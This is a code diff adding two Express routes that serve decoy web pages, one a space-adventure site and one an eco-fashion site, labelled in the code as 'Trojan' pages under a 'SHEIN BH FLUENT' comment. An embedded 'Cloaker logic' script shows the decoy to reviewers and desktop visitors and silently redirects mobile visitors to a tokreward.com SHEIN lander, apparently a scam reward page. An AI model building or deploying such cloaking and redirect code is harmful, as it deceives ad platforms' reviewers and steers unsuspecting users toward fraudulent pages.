@@ -2107,6 +2107,242 @@ app.get('/8762/:slug', (req, res, next) => {
 });
 
 // SHEIN BH FLUENT
+app.get('/8767/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/sheinesp.html?slug=876`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Cosmic Adventures</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Nova Square', sans-serif;
+                    background-color: #0c0c2c;
+                    color: #e0e0ff;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background: linear-gradient(45deg, #1a1a4a, #4a1a4a);
+                    color: #fff;
+                    text-align: center;
+                    padding: 2em;
+                    border-bottom: 3px solid #8a2be2;
+                }
+                .space-exploration {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+                    gap: 2em;
+                    margin-top: 2em;
+                }
+                .space-item {
+                    background-color: rgba(255, 255, 255, 0.1);
+                    border-radius: 15px;
+                    padding: 1.5em;
+                    box-shadow: 0 4px 6px rgba(138, 43, 226, 0.3);
+                    text-align: center;
+                    transition: transform 0.3s ease;
+                }
+                .space-item:hover {
+                    transform: translateY(-5px);
+                }
+                .space-item img {
+                    max-width: 100%;
+                    border-radius: 10px;
+                    margin-bottom: 1em;
+                }
+                footer {
+                    background: linear-gradient(45deg, #4a1a4a, #1a1a4a);
+                    color: #fff;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 2em;
+                    border-top: 3px solid #8a2be2;
+                }
+                footer a {
+                    color: #ffa500;
+                    text-decoration: none;
+                }
+                h1, h2, h3 {
+                    color: #ffa500;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Interstellar Voyages</h1>
+            </header>
+            <div class="container">
+                <main>
+                    <h2>Embark on Epic Space Odysseys</h2>
+                    <p>Welcome to ${slug} Cosmic Adventures, where the boundaries of space exploration are pushed to new frontiers. Discover the wonders of the universe through our cutting-edge virtual experiences.</p>
+                    <div class="space-exploration">
+                        <div class="space-item">
+                            <img src="https://placehold.co/300x200/4a1a4a/ffa500?text=Mars+Colony" alt="Mars Colony">
+                            <h3>Mars Colony Simulator</h3>
+                            <p>Experience life on the Red Planet with our immersive Mars colony simulation. Build, explore, and survive in the harsh Martian environment.</p>
+                        </div>
+                        <div class="space-item">
+                            <img src="https://placehold.co/300x200/1a1a4a/ffa500?text=Nebula+Explorer" alt="Nebula Explorer">
+                            <h3>Nebula Explorer</h3>
+                            <p>Journey through colorful nebulae and witness the birth of stars in this awe-inspiring virtual tour of the cosmos.</p>
+                        </div>
+                        <div class="space-item">
+                            <img src="https://placehold.co/300x200/4a1a4a/ffa500?text=Zero+G+Training" alt="Zero G Training">
+                            <h3>Zero Gravity Training</h3>
+                            <p>Prepare for space travel with our state-of-the-art zero gravity simulation. Train like an astronaut from the comfort of your home.</p>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <footer>
+                <p>Explore the cosmos with ${slug} &copy; 2024 ${slug} Cosmic Adventures | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 876 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9491/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=949`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Eco-Fashion</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Quicksand', sans-serif;
+                    background-color: #f0f4f0;
+                    color: #2c3e50;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background: linear-gradient(135deg, #2ecc71, #27ae60);
+                    color: white;
+                    text-align: center;
+                    padding: 2em;
+                    border-radius: 0 0 20px 20px;
+                }
+                .fashion-showcase {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+                    gap: 2em;
+                    margin-top: 2em;
+                }
+                .fashion-item {
+                    background-color: white;
+                    border-radius: 15px;
+                    padding: 1.5em;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                    text-align: center;
+                    transition: transform 0.3s ease;
+                }
+                .fashion-item:hover {
+                    transform: translateY(-5px);
+                }
+                .fashion-item img {
+                    max-width: 100%;
+                    border-radius: 10px;
+                    margin-bottom: 1em;
+                }
+                footer {
+                    background: linear-gradient(135deg, #27ae60, #2ecc71);
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 2em;
+                    border-radius: 20px 20px 0 0;
+                }
+                footer a {
+                    color: #ecf0f1;
+                    text-decoration: none;
+                }
+                h1, h2, h3 {
+                    color: #2c3e50;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Sustainable Style</h1>
+            </header>
+            <div class="container">
+                <main>
+                    <h2>Embrace Eco-Friendly Fashion</h2>
+                    <p>Welcome to ${slug} Eco-Fashion, where style meets sustainability. Discover our collection of environmentally conscious clothing and accessories that don't compromise on fashion or ethics.</p>
+                    <div class="fashion-showcase">
+                        <div class="fashion-item">
+                            <img src="https://placehold.co/300x200/2ecc71/ffffff?text=Organic+Tee" alt="Organic Cotton Tee">
+                            <h3>Organic Cotton Tee</h3>
+                            <p>Our bestselling tee made from 100% organic cotton. Soft, durable, and kind to the planet.</p>
+                        </div>
+                        <div class="fashion-item">
+                            <img src="https://placehold.co/300x200/27ae60/ffffff?text=Recycled+Denim" alt="Recycled Denim Jeans">
+                            <h3>Recycled Denim Jeans</h3>
+                            <p>Stylish jeans crafted from recycled denim and organic cotton. Reduces water usage and textile waste.</p>
+                        </div>
+                        <div class="fashion-item">
+                            <img src="https://placehold.co/300x200/2ecc71/ffffff?text=Vegan+Leather" alt="Vegan Leather Bag">
+                            <h3>Vegan Leather Bag</h3>
+                            <p>Chic and cruelty-free. Our vegan leather bags are made from innovative plant-based materials.</p>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <footer>
+                <p>Look good, feel good with ${slug} &copy; 2024 ${slug} Eco-Fashion | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 949 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/870/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/shein.html?slug=870`;
